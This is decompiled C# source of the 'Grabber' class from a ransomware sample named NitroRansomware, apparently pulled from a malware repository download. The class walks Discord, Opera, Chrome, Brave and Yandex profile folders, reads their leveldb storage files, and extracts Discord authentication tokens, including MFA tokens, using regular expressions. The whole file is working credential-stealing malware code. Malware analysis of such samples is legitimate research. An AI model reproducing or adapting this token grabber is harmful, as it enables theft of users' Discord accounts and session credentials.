// Decompiled with JetBrains decompiler
// Type: NitroRansomware.Grabber
// Assembly: NitroRansomware, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 884F7023-5B8E-423B-BD61-5C84B42B2DFE
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.04-msil\HEUR-Trojan-Ransom.MSIL.Gen.gen-92190c9789485a0d96bced7040080f0ae35c02898c3d31a65d50ecd659b80f09.exe

using System;
using System.Collections.Generic;
using System.IO;
using System.Text.RegularExpressions;

namespace NitroRansomware
{
  internal class Grabber
  {
    private static List<string> target = new List<string>();

    private static void Scan()
    {
      string folderPath1 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
      string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
      Grabber.target.Add(folderPath1 + "\\Discord");
      Grabber.target.Add(folderPath1 + "\\discordcanary");
      Grabber.target.Add(folderPath1 + "\\discordptb");
      Grabber.target.Add(folderPath1 + "\\\\Opera Software\\Opera Stable");
      Grabber.target.Add(folderPath2 + "\\Google\\Chrome\\User Data\\Default");
      Grabber.target.Add(folderPath2 + "\\BraveSoftware\\Brave-Browser\\User Data\\Default");
      Grabber.target.Add(folderPath2 + "\\Yandex\\YandexBrowser\\User Data\\Default");
    }

    public static List<string> Grab()
    {
      Grabber.Scan();
      List<string> stringList = new List<string>();
      foreach (string path in Grabber.target)
      {
        if (Directory.Exists(path))
        {
          foreach (FileInfo file in new DirectoryInfo(path + "\\Local Storage\\leveldb").GetFiles("*.ldb"))
          {
            string end = file.OpenText().ReadToEnd();
            foreach (Match match in Regex.Matches(end, "[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}"))
              stringList.Add(match.Value);
            foreach (Match match in Regex.Matches(end, "mfa\\.[\\w-]{84}"))
              stringList.Add(match.Value);
          }
        }
      }
      return stringList;
    }
  }
}
